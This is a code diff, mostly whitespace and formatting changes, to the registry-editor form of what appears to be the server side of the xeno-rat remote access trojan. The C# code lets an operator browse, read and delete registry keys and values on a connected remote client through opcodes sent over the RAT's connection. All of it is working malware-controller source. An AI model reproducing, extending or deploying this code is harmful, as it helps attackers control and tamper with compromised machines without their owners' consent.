@@ -9,7 +9,6 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Windows.Forms.VisualStyles;
 using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 
 namespace xeno_rat_server.Forms
@@ -18,13 +17,13 @@ namespace xeno_rat_server.Forms
     {
         private static readonly Dictionary<byte, string> TypeIdentifierReverseMap = new Dictionary<byte, string>
         {
-            { 1, "REG_SZ" },
-            { 2, "REG_EXPAND_SZ" },
-            { 3, "REG_BINARY" },
-            { 4, "REG_DWORD" },
-            { 5, "REG_MULTI_SZ" },
-            { 6, "REG_QWORD" },
-            { 7, "Unknown" }
+        { 1, "REG_SZ" },
+        { 2, "REG_EXPAND_SZ" },
+        { 3, "REG_BINARY" },
+        { 4, "REG_DWORD" },
+        { 5, "REG_MULTI_SZ" },
+        { 6, "REG_QWORD" },
+        { 7, "Unknown" }
         };
 
         Node client;
@@ -34,8 +33,8 @@ namespace xeno_rat_server.Forms
             InitializeComponent();
             client.AddTempOnDisconnect(TempOnDisconnect);
             StartAdd();
-
         }
+
         public void TempOnDisconnect(Node node)
         {
             if (node == client)
@@ -49,7 +48,8 @@ namespace xeno_rat_server.Forms
                 }
             }
         }
-        public async Task StartAdd() 
+
+        public async Task StartAdd()
         {
             RegInfo HKLM = await GetRegInfo("HKLM");
             RegInfo HKCU = await GetRegInfo("HKCU");
@@ -59,9 +59,9 @@ namespace xeno_rat_server.Forms
             treeNodeHKLM.Tag = HKLM;
             treeView1.BeginUpdate();
             treeView1.Nodes.Add(treeNodeHKCU);
-            foreach (string i in HKCU.subKeys) 
+            foreach (string i in HKCU.subKeys)
             {
-                TreeNode temp=treeView1.Nodes[0].Nodes.Add(i);
+                TreeNode temp = treeView1.Nodes[0].Nodes.Add(i);
                 temp.Tag = i;
             }
             treeView1.Nodes.Add(treeNodeHKLM);
@@ -72,6 +72,7 @@ namespace xeno_rat_server.Forms
             }
             treeView1.EndUpdate();
         }
+
         public async Task<RegInfo> GetRegInfo(string path)
         {
             byte[] opcode = new byte[] { 1 };
@@ -79,14 +80,15 @@ namespace xeno_rat_server.Forms
             await client.SendAsync(opcode);
             await client.SendAsync(data);
             bool worked = (await client.ReceiveAsync())[0] == 1;
-            if (!worked) 
+            if (!worked)
             {
                 return null;
             }
             byte[] SearlizedData = await client.ReceiveAsync();
             return DeserializeRegInfo(SearlizedData);
         }
-        public async Task<bool> DeleteRegSubKey(string path) 
+
+        public async Task<bool> DeleteRegSubKey(string path)
         {
             byte[] opcode = new byte[] { 2 };
             byte[] data = Encoding.UTF8.GetBytes(path);
@@ -95,6 +97,7 @@ namespace xeno_rat_server.Forms
             bool worked = (await client.ReceiveAsync())[0] == 1;
             return worked;
         }
+
         public async Task<bool> DeleteRegKey(string path, string key)
         {
             byte[] opcode = new byte[] { 3 };
@@ -106,69 +109,71 @@ namespace xeno_rat_server.Forms
             bool worked = (await client.ReceiveAsync())[0] == 1;
             return worked;
         }
+
         public static RegInfo DeserializeRegInfo(byte[] data)
         {
             RegInfo regInfo = new RegInfo();
 
             using (MemoryStream memoryStream = new MemoryStream(data))
-            using (BinaryReader reader = new BinaryReader(memoryStream))
-            {
-                regInfo.ContainsSubKeys = reader.ReadBoolean();
-                int subKeyCount = reader.ReadInt32();
-                regInfo.subKeys = new string[subKeyCount];
-                for (int i = 0; i < subKeyCount; i++)
+                using (BinaryReader reader = new BinaryReader(memoryStream))
                 {
-                    regInfo.subKeys[i] = reader.ReadString();
-                }
-                regInfo.FullPath = reader.ReadString();
-                int valueCount = reader.ReadInt32();
-
-                for (int i = 0; i < valueCount; i++)
-                {
-                    RegValue value = new RegValue();
-                    value.KeyName = reader.ReadString();
-                    value.FullPath = reader.ReadString();
-                    value.Type = TypeIdentifierReverseMap[reader.ReadByte()];
-
-                    byte valueType = reader.ReadByte();
-                    switch (valueType)
+                    regInfo.ContainsSubKeys = reader.ReadBoolean();
+                    int subKeyCount = reader.ReadInt32();
+                    regInfo.subKeys = new string[subKeyCount];
+                    for (int i = 0; i < subKeyCount; i++)
                     {
-                        case 1: // REG_SZ
-                            value.Value = reader.ReadString();
-                            break;
-                        case 2: // REG_EXPAND_SZ
-                            value.Value = reader.ReadString();
-                            break;
-                        case 3: // REG_BINARY
-                            int byteArrayLength = reader.ReadInt32();
-                            value.Value = reader.ReadBytes(byteArrayLength);
-                            break;
-                        case 4: // REG_DWORD
-                            value.Value = reader.ReadInt32();
-                            break;
-                        case 5: // REG_MULTI_SZ
-                            int stringArrayLength = reader.ReadInt32();
-                            string[] stringArray = new string[stringArrayLength];
-                            for (int j = 0; j < stringArrayLength; j++)
-                            {
-                                stringArray[j] = reader.ReadString();
-                            }
-                            value.Value = stringArray;
-                            break;
-                        case 6: // REG_QWORD
-                            value.Value = reader.ReadInt64();
-                            break;
-                        default: // Unknown
-                            value.Value = null;
-                            break;
+                        regInfo.subKeys[i] = reader.ReadString();
                     }
+                    regInfo.FullPath = reader.ReadString();
+                    int valueCount = reader.ReadInt32();
 
-                    regInfo.Values.Add(value);
+                    for (int i = 0; i < valueCount; i++)
+                    {
+                        RegValue value = new RegValue();
+                        value.KeyName = reader.ReadString();
+                        value.FullPath = reader.ReadString();
+                        value.Type = TypeIdentifierReverseMap[reader.ReadByte()];
+
+                        byte valueType = reader.ReadByte();
+                        switch (valueType)
+                        {
+                            case 1: // REG_SZ
+                                value.Value = reader.ReadString();
+                                break;
+                            case 2: // REG_EXPAND_SZ
+                                value.Value = reader.ReadString();
+                                break;
+                            case 3: // REG_BINARY
+                                int byteArrayLength = reader.ReadInt32();
+                                value.Value = reader.ReadBytes(byteArrayLength);
+                                break;
+                            case 4: // REG_DWORD
+                                value.Value = reader.ReadInt32();
+                                break;
+                            case 5: // REG_MULTI_SZ
+                                int stringArrayLength = reader.ReadInt32();
+                                string[] stringArray = new string[stringArrayLength];
+                                for (int j = 0; j < stringArrayLength; j++)
+                                {
+                                    stringArray[j] = reader.ReadString();
+                                }
+                                value.Value = stringArray;
+                                break;
+                            case 6: // REG_QWORD
+                                value.Value = reader.ReadInt64();
+                                break;
+                            default: // Unknown
+                                value.Value = null;
+                                break;
+                        }
+
+                        regInfo.Values.Add(value);
+                    }
                 }
-            }
 
             return regInfo;
         }
+
         private async void treeView1_BeforeExpand(object sender, TreeViewCancelEventArgs e)
         {
             foreach (TreeNode i in e.Node.Nodes)
@@ -176,13 +181,14 @@ namespace xeno_rat_server.Forms
                 RegInfo reginfo = await GetRegInfo(i.FullPath);
                 i.Tag = reginfo;
                 if (reginfo == null) continue;
-                foreach (string n in reginfo.subKeys) 
+                foreach (string n in reginfo.subKeys)
                 {
-                    TreeNode temp =i.Nodes.Add(n);
+                    TreeNode temp = i.Nodes.Add(n);
                     temp.Tag = n;
                 }
             }
         }
+
         private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
         {
             if (treeView1.SelectedNode != null)
@@ -192,7 +198,7 @@ namespace xeno_rat_server.Forms
                 TreeNode clickedNode = treeView1.SelectedNode;
                 RegInfo regInfo = clickedNode.Tag as RegInfo;
                 if (regInfo == null) return;
-                foreach (RegValue i in regInfo.Values) 
+                foreach (RegValue i in regInfo.Values)
                 {
                     ListViewItem lvi = new ListViewItem();
                     lvi.Tag = i;
@@ -205,7 +211,7 @@ namespace xeno_rat_server.Forms
                     {
                         lvi.SubItems.Add(BitConverter.ToString((byte[])i.Value));
                     }
-                    else if (i.Type == "REG_MULTI_SZ") 
+                    else if (i.Type == "REG_MULTI_SZ")
                     {
                         lvi.SubItems.Add(string.Join(" ", (string[])i.Value));
                     }
@@ -220,10 +226,6 @@ namespace xeno_rat_server.Forms
                 textBox1.Text = clickedNode.FullPath;
             }
         }
-        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
-        {
-
-        }
 
         private async void button1_Click(object sender, EventArgs e)
         {
@@ -231,7 +233,6 @@ namespace xeno_rat_server.Forms
             listView1.Items.Clear();
             treeView1.Nodes.Clear();
             await StartAdd();
-
         }
 
         private void treeView1_Click(object sender, EventArgs e)
@@ -257,6 +258,7 @@ namespace xeno_rat_server.Forms
             }
         }
     }
+
     public class RegValue
     {
         public string KeyName { get; set; }
@@ -264,6 +266,7 @@ namespace xeno_rat_server.Forms
         public string Type { get; set; }
         public object Value { get; set; }
     }
+
     public class RegInfo
     {
         public bool ContainsSubKeys { get; set; }
